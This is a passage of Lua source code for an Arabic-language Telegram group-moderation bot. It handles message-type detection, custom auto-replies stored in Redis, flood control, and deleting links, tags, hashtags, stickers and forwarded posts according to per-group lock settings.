if not KASPERdx1:sismember(KASPER.."bot:groups",msg.chat_id_) then
KASPERdx1:sadd(KASPER.."bot:groups",msg.chat_id_)
end end end
--     By Developer KASPER     -- 
-------- MSG TYPES 
if msg.content_ then
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
print("This is [ Inline ]")
msg_type = 'MSG:Inline'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageText" then
text = msg.content_.text_
print("This is [ Text ]")
msg_type = 'MSG:Text'
end
--     By Developer KASPER     -- 
 if msg.content_.ID == "MessageChatAddMembers" then
KASPERdx1:incr(KASPER..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessagePhoto" then
KASPERdx1:incr(KASPER.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageAnimation" then
KASPERdx1:incr(KASPER.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVideo" then
KASPERdx1:incr(KASPER.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVoice" then
KASPERdx1:incr(KASPER.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageSticker" then
KASPERdx1:incr(KASPER.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessagePhoto" then
print("This is [ Photo ]")
msg_type = 'MSG:Photo'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageChatAddMembers" then
print("This is [ New User Add ]")
msg_type = 'MSG:NewUserAdd'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
msg_type = 'MSG:Document'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageSticker" then
print("This is [ Sticker ]")
msg_type = 'MSG:Sticker'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageAudio" then
print("This is [ Audio ]")
msg_type = 'MSG:Audio'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageVoice" then
print("This is [ Voice ]")
msg_type = 'MSG:Voice'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageVideo" then
print("This is [ Video ]")
msg_type = 'MSG:Video'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageAnimation" then
print("This is [ Gif ]")
msg_type = 'MSG:Gif'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageLocation" then
print("This is [ Location ]")
msg_type = 'MSG:Location'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By link ]")
if KASPERdx1:get(KASPER.."UnKedDeleteMessage"..msg.chat_id_) == "open" then
local Text = '✟︙اهلا عزيزي .\n✟︙يجب علينا التأكد أنك لست روبوت .\n✟︙تم تقييدك اضغط الزر بالاسفل 🔽\n'
keyboard = {} -- الحقوق محفوظه لسورس فايدر لتخمط بدون ذكر المصدر
keyboard.inline_keyboard = {{{text = '- اضغط هنا لفك تقييدك •', callback_data="/UnKed"},},}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
KASPERdx1:sadd(KASPER.."KASPERdx1:Un:Ked"..msg.chat_id_,msg.sender_user_id_)
https.request("https://api.telegram.org/bot"..tokenbot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
msg_type = 'MSG:NewUser'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By link ]")
msg_type = 'MSG:NewUser'
end
--     By Developer KASPER     -- 
if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
print("This is [ MarkDown ]")
msg_type = 'MSG:MarkDown'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By Link ]")
msg_type = 'MSG:JoinByLink'
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageContact" then
print("This is [ Contact ]")
msg_type = 'MSG:Contact'
end 
---------------
end
--     By Developer KASPER     -- 
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end end
--     By Developer KASPER     -- 
if msg.content_.photo_ then
if KASPERdx1:get(KASPER..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تغيير صوره المجموعه . \n', 1, 'md') 
KASPERdx1:del(KASPER..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
setphoto(msg.chat_id_, photo_id)
end end
--     By Developer KASPER     -- 
text = msg.content_.text_ 
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local content_text = KASPERdx1:get(KASPER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'save_repgp' then 
if text == 'الغاء' then
local delrep_owner = KASPERdx1:get(KASPER..'delrep_owner'..msg.chat_id_..'')
KASPERdx1:srem(KASPER..'rep_owner'..msg.chat_id_..'',delrep_owner)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم الغاء حفظ الرد . \n', 1, 'md')
KASPERdx1:del(KASPER..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
KASPERdx1:del(KASPER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_)
KASPERdx1:del(KASPER..'delrep_owner'..msg.chat_id_..'')
return false
end
KASPERdx1:del(KASPER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
local content_text = KASPERdx1:get(KASPER..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then KASPERdx1:set(KASPER..'video_repgp'..content_text..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then KASPERdx1:set(KASPER..'file_repgp'..content_text..''..msg.chat_id_..'', msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then KASPERdx1:set(KASPER..'stecker_repgp'..content_text..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then KASPERdx1:set(KASPER..'voice_repgp'..content_text..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then KASPERdx1:set(KASPER..'audio_repgp'..content_text..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
KASPERdx1:set(KASPER..'photo_repgp'..content_text..''..msg.chat_id_..'', photo_in_group) 
end
if msg.content_.animation_ then KASPERdx1:set(KASPER..'gif_repgp'..content_text..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
KASPERdx1:set(KASPER..'text_repgp'..content_text..''..msg.chat_id_..'', msg.content_.text_)
end 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم حفظ الرد . \n', 1, 'md') 
KASPERdx1:del(KASPER..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
KASPERdx1:del(KASPER..'delrep_owner'..msg.chat_id_..'')
return false 
end end
if msg.content_.text_ and not KASPERdx1:get(KASPER..'lock_reeeep'..msg.chat_id_) then 
if KASPERdx1:get(KASPER..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, KASPERdx1:get(KASPER..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if KASPERdx1:get(KASPER..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, KASPERdx1:get(KASPER..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if KASPERdx1:get(KASPER..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, KASPERdx1:get(KASPER..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if KASPERdx1:get(KASPER..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, KASPERdx1:get(KASPER..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if KASPERdx1:get(KASPER..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, KASPERdx1:get(KASPER..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if KASPERdx1:get(KASPER..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, KASPERdx1:get(KASPER..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if KASPERdx1:get(KASPER..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, KASPERdx1:get(KASPER..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..''))
end 
if KASPERdx1:get(KASPER..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') then
function KASPER(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local KASPERdxs = (KASPERdx1:get('KASPER:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = KASPERdx1:get(KASPER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = KASPERdx1:get(KASPER..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#msgs',(user_msgs + KASPERdxs or 'لا يوجد'))
local Text = Text:gsub('#stast',(renk_KASPER(msg) or 'لا يوجد'))
KASPERdx(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
end
getUser(msg.sender_user_id_, KASPER)
end end
--     By Developer KASPER     -- 
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local content_text = KASPERdx1:get(KASPER.."add:repallt"..msg.sender_user_id_)
if content_text == 'save_rep' then
if text == 'الغاء' then
local delrep_sudo = KASPERdx1:get(KASPER..'delrep_sudo')
KASPERdx1:del(KASPER.."rep_sudo",delrep_sudo)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم الغاء حفظ الرد . \n', 1, 'md')
KASPERdx1:del(KASPER.."addreply2:"..msg.sender_user_id_)
KASPERdx1:del(KASPER.."add:repallt"..msg.sender_user_id_)
KASPERdx1:del(KASPER.."delrep_sudo")
return false
end
KASPERdx1:del(KASPER.."add:repallt"..msg.sender_user_id_)
local content_text = KASPERdx1:get(KASPER.."addreply2:"..msg.sender_user_id_)
if msg.content_.video_ then
KASPERdx1:set(KASPER.."video_repall"..content_text, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
KASPERdx1:set(KASPER.."file_repall"..content_text, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
KASPERdx1:set(KASPER.."stecker_repall"..content_text, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
KASPERdx1:set(KASPER.."voice_repall"..content_text, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
KASPERdx1:set(KASPER.."audio_repall"..content_text, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
KASPERdx1:set(KASPER.."photo_repall"..content_text, photo_in_all_groups)
end
if msg.content_.animation_ then
KASPERdx1:set(KASPER.."gif_repall"..content_text, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
KASPERdx1:set(KASPER.."text_repall"..content_text, msg.content_.text_)
end 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم حفظ الرد . \n', 1, 'md') 
KASPERdx1:del(KASPER.."addreply2:"..msg.sender_user_id_)
KASPERdx1:del(KASPER..'delrep_sudo')
return false end end
if msg.content_.text_ and not KASPERdx1:get(KASPER..'lock_reeeep'..msg.chat_id_) then
if KASPERdx1:get(KASPER.."video_repall"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, KASPERdx1:get(KASPER.."video_repall"..msg.content_.text_))
end
if KASPERdx1:get(KASPER.."file_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, KASPERdx1:get(KASPER.."file_repall"..msg.content_.text_))
end
if KASPERdx1:get(KASPER.."voice_repall"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, KASPERdx1:get(KASPER.."voice_repall"..msg.content_.text_))
end
if KASPERdx1:get(KASPER.."audio_repall"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, KASPERdx1:get(KASPER.."audio_repall"..msg.content_.text_))
end
if KASPERdx1:get(KASPER.."photo_repall"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, KASPERdx1:get(KASPER.."photo_repall"..msg.content_.text_))
end
if  KASPERdx1:get(KASPER.."gif_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, KASPERdx1:get(KASPER.."gif_repall"..msg.content_.text_))
end
if KASPERdx1:get(KASPER.."stecker_repall"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, KASPERdx1:get(KASPER.."stecker_repall"..msg.content_.text_))
end
if KASPERdx1:get(KASPER.."text_repall"..msg.content_.text_) then
function KASPER(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local KASPERdxs = (KASPERdx1:get('KASPER:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = KASPERdx1:get(KASPER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = KASPERdx1:get(KASPER.."text_repall"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#msgs',(user_msgs + KASPERdxs or 'لا يوجد'))
local Text = Text:gsub('#stast',(renk_KASPER(msg) or 'لا يوجد'))
KASPERdx(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
end
getUser(msg.sender_user_id_, KASPER)
end end 
--     By Developer KASPER     -- 
-------- Flood Max 
local flmax = 'flood:max:'..msg.chat_id_
if not KASPERdx1:get(KASPER..flmax) then
floodMax = 5
else
floodMax = tonumber(KASPERdx1:get(KASPER..flmax))
end
--     By Developer KASPER     -- 
-------- Msg
local pm = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
if not KASPERdx1:get(KASPER..pm) then
msgs = 0
else
msgs = tonumber(KASPERdx1:get(KASPER..pm))
end
--     By Developer KASPER     -- 
-------- Flood Check Time
local TIME_CHECK = 2
-------- Flood Check
local hashflood = 'anti-flood:'..msg.chat_id_
if msgs > (floodMax - 1) then
if KASPERdx1:get(KASPER..'floodstatus'..msg.chat_id_) == 'Kicked' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
local KASPER = '✟︙العضو ('..msg.sender_user_id_..') \n✟︙قام بالتكرار المحدد تم طرده  '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 11, string.len(msg.sender_user_id_))
elseif KASPERdx1:get(KASPER..'floodstatus'..msg.chat_id_) == 'DelMsg' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
else
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
end end
--     By Developer KASPER     -- 
local check_username = function(extra, result, success)
local fname = result.first_name_ or ""
local lname = result.last_name_ or ""
local name = fname .. " " .. lname
local username = result.username_
local svuser = "user:Name" .. result.id_
local id = result.id_
if username then
KASPERdx1:set(KASPER..svuser, "@" .. username)
else
KASPERdx1:set(KASPER..svuser, name)
end end
getUser(msg.sender_user_id_, check_username)
--     By Developer KASPER     -- 
if is_banned(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
return
end
--     By Developer KASPER     -- 
if is_muted(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
--     By Developer KASPER     -- 
if is_gbanned(msg.sender_user_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(chat,msgs)
return
end
--     By Developer KASPER     -- 
if is_mutedall(msg.sender_user_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
--     By Developer KASPER     -- 
if KASPERdx1:get(KASPER..'bot:muteall'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
--     By Developer KASPER     -- 
KASPERdx1:incr(KASPER..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
KASPERdx1:incr(KASPER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
KASPERdx1:incr(KASPER..'group:msgs'..msg.chat_id_)
if msg.content_.ID == "MessagePinMessage" then
if KASPERdx1:get(KASPER..'pinnedmsg'..msg.chat_id_) and KASPERdx1:get(KASPER..'bot:pin:mute'..msg.chat_id_) then
unpinmsg(msg.chat_id_)
local pin_id = KASPERdx1:get(KASPER..'pinnedmsg'..msg.chat_id_)
pinmsg(msg.chat_id_,pin_id,0)
end end
--     By Developer KASPER     -- 
if KASPERdx1:get(KASPER..'bot:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
if KASPERdx1:get(KASPER..'lang:gp:'..msg.chat_id_) then
end
KASPERdx1:del(KASPER..'bot:viewget'..msg.sender_user_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙مشاهدات المنشور '..msg.views_..' مشاهده تقريبا .', 1, 'md')
KASPERdx1:del(KASPER..'bot:viewget'..msg.sender_user_id_)
end end
--     By Developer KASPER     -- 
-------- Photo
if msg_type == 'MSG:Photo' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
KASPERdx1:setex(KASPER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Photo]")
end end end
if KASPERdx1:get(KASPER..'bot:photo:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Photo]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Photo]")
if KASPERdx1:get(KASPER..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end end
if KASPERdx1:get(KASPER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Photo]")
end end
if msg.content_.caption_:match("#") then
if KASPERdx1:get(KASPER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Photo]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if KASPERdx1:get(KASPER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Photo]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if KASPERdx1:get(KASPER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Photo]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if KASPERdx1:get(KASPER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Photo]")
end end end end
--     By Developer KASPER     -- 
-------- Markdown
elseif msg_type == 'MSG:MarkDown' then
if KASPERdx1:get(KASPER..'markdown:lock'..msg.chat_id_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end end
--     By Developer KASPER     -- 
-------- Document
elseif msg_type == 'MSG:Document' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
KASPERdx1:setex(KASPER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Document]")
end end end
if KASPERdx1:get(KASPER..'bot:document:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Document]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Document]")
if KASPERdx1:get(KASPER..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end end
if KASPERdx1:get(KASPER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Document]")
end end
if msg.content_.caption_:match("#") then
if KASPERdx1:get(KASPER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Document]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if KASPERdx1:get(KASPER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Document]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if KASPERdx1:get(KASPER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Document]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if KASPERdx1:get(KASPER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Document]")
end end end end
--     By Developer KASPER     -- 
-------- Inline
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
KASPERdx1:setex(KASPER..pm, TIME_CHECK, msgs+1)
end
if KASPERdx1:get(KASPER..'bot:inline:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Inline]")
end end
--     By Developer KASPER     -- 
-------- Sticker
elseif msg_type == 'MSG:Sticker' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
KASPERdx1:setex(KASPER..pm, TIME_CHECK, msgs+1)
end
if KASPERdx1:get(KASPER..'bot:sticker:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Sticker]")
end end
elseif msg_type == 'MSG:JoinByLink' then
if KASPERdx1:get(KASPER..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_ 
 delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [JoinByLink]")
return
end
function get_welcome(extra,result,success)
if KASPERdx1:get(KASPER..'get:welcome'..msg.chat_id_) then
text = KASPERdx1:get(KASPER..'get:welcome'..msg.chat_id_)
else
text = '✟︙هلا بالكمر 👋 ،\n✟︙name ،\n✟︙@user ،\n✟︙في '..title_name(msg.chat_id_)..' ،\n'
end
local text = text:gsub('name',(result.first_name_ or ''))
local text = text:gsub('lname',(result.last_name_ or ''))
local text = text:gsub('user',(result.username_ or 'KASPER_Ch'))
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if KASPERdx1:get(KASPER.."bot:welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     By Developer KASPER     -- 
-------- New User Add
elseif msg_type == 'MSG:NewUserAdd' then
if KASPERdx1:get(KASPER..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [NewUserAdd]")
return
end
if msg.content_.members_[0].username_ and msg.content_.members_[0].username_:match("[Bb][Oo][Tt]$") then
if not is_momod(msg.content_.members_[0].id_, msg.chat_id_) then
